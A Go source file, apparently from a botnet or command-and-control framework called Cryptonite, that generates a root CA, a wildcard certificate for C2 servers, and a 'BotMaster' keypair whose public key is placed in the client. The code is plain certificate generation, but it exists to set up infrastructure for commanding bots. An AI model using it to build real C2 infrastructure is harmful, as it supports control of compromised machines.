package main

/*
*   This program is part of Cryptonite and is used to create the rootCA
*   and certificates for each C2s you want deploy.
*
 */

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"math/big"
	"time"
)

const (
	CAKeySize        = 4096
	ServerKeySize    = 2048
	BotMasterKeySize = 2048
	// The maximum value for X.509 certificate serial number is 2^159-1,
	// 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
	maxSerialNumber = 0x7FFFFFFFFFFFFFFF
)

func getUniqueSerialNumber() *big.Int {
	value, _ := rand.Int(rand.Reader, big.NewInt(maxSerialNumber))
	return value
}

func DER2PEM(key []byte, type_txt string) []byte {
	var block pem.Block
	block.Bytes = key
	block.Type = type_txt
	return pem.EncodeToMemory(&block)
}

func generateCA() (*rsa.PrivateKey, *rsa.PublicKey, []byte) {
	var pvt *rsa.PrivateKey
	var pub *rsa.PublicKey
	var err error

	var ca = x509.Certificate{
		Version:      0x2, //x.509v3
		SerialNumber: getUniqueSerialNumber(),
		Subject: pkix.Name{
			Country:            []string{"Gotham"},
			Organization:       []string{"Wayne Enterprises"},
			OrganizationalUnit: []string{"Batcave"},
			CommonName:         "Bruce Wayne",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(10, 0, 0),
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageCRLSign,
		BasicConstraintsValid: true,
		IsCA: true,
	}

	pvt, err = rsa.GenerateKey(rand.Reader, CAKeySize)
	if err != nil {
		panic("Failed generating CA's keys")
	}
	if pvt.N.BitLen() != CAKeySize {
		panic("CA's pvt key too short")
	}
	pub = &pvt.PublicKey
	CAcert, err := x509.CreateCertificate(rand.Reader, &ca, &ca, pub, pvt)
	if err != nil {
		panic("Failed creating CA's certificate")
	}

	return pvt, pub, CAcert
}

func generateServerCert(ca []byte, CApvt interface{}) (*rsa.PrivateKey, *rsa.PublicKey, []byte) {
	var pvt *rsa.PrivateKey
	var pub *rsa.PublicKey
	var err error

	var cert = x509.Certificate{
		Version:      0x2, //x.509v3
		SerialNumber: getUniqueSerialNumber(),
		Subject: pkix.Name{
			CommonName: "*",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(10, 0, 0),
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth}, //Mandatory for a C2s
		BasicConstraintsValid: false,
	}

	pvt, err = rsa.GenerateKey(rand.Reader, ServerKeySize)
	if err != nil {
		panic("Failed generating Server's keys")
	}
	if pvt.N.BitLen() != ServerKeySize {
		panic("Server's pvt key too short")
	}

	pub = &pvt.PublicKey
	CAcert, _ := x509.ParseCertificates(ca)
	C2Scert, err := x509.CreateCertificate(rand.Reader, &cert, CAcert[0], pub, CApvt)
	if err != nil {
		panic("Failed creating Server's certificate")
	}

	return pvt, pub, C2Scert
}

func generateBotmasterKeys() (*rsa.PrivateKey, *rsa.PublicKey) {
	pvt, err := rsa.GenerateKey(rand.Reader, BotMasterKeySize)
	if err != nil {
		panic("Failed generating BotMaster's keys")
	}
	if pvt.N.BitLen() != BotMasterKeySize {
		panic("BotMaster's pvt key too short")
	}
	return pvt, &pvt.PublicKey
}

func main() {
	var CAcert []byte
	var CApvt *rsa.PrivateKey

	CApvt, _, CAcert = generateCA()
	PEMCApvt := DER2PEM(x509.MarshalPKCS1PrivateKey(CApvt), "RSA PRIVATE KEY")
	PEMCAcert := DER2PEM(CAcert, "CERTIFICATE")
	ioutil.WriteFile("server/ca.crt", PEMCAcert, 0444)
	ioutil.WriteFile("client/ca.crt", PEMCAcert, 0444)
	ioutil.WriteFile("server/ca.key", PEMCApvt, 0400)
	fmt.Printf("[+] Generate CA keys and certificate\t\t[ rsa %d ]\n", CAKeySize)

	C2Spvt, _, C2Scert := generateServerCert(CAcert, CApvt)
	PEMC2Spvt := DER2PEM(x509.MarshalPKCS1PrivateKey(C2Spvt), "RSA PRIVATE KEY")
	PEMC2Scert := DER2PEM(C2Scert, "CERTIFICATE")
	ioutil.WriteFile("server/server.crt", PEMC2Scert, 0444)
	ioutil.WriteFile("server/server.key", PEMC2Spvt, 0400)
	fmt.Printf("[+] Generate C2s keys and certificate\t\t[ rsa %d ]\n", ServerKeySize)

	BMpvt, BMpub := generateBotmasterKeys()
	PEMBMpvt := DER2PEM(x509.MarshalPKCS1PrivateKey(BMpvt), "RSA PRIVATE KEY")
	DERBMpub, _ := x509.MarshalPKIXPublicKey(BMpub)
	PEMBMpub := DER2PEM(DERBMpub, "RSA PUBLIC KEY")
	ioutil.WriteFile("client/botmaster.pub", PEMBMpub, 0444)
	ioutil.WriteFile("server/botmaster.key", PEMBMpvt, 0400)
	fmt.Printf("[+] Generate BotMaster keys and certificate\t[ rsa %d ]\n", BotMasterKeySize)

}
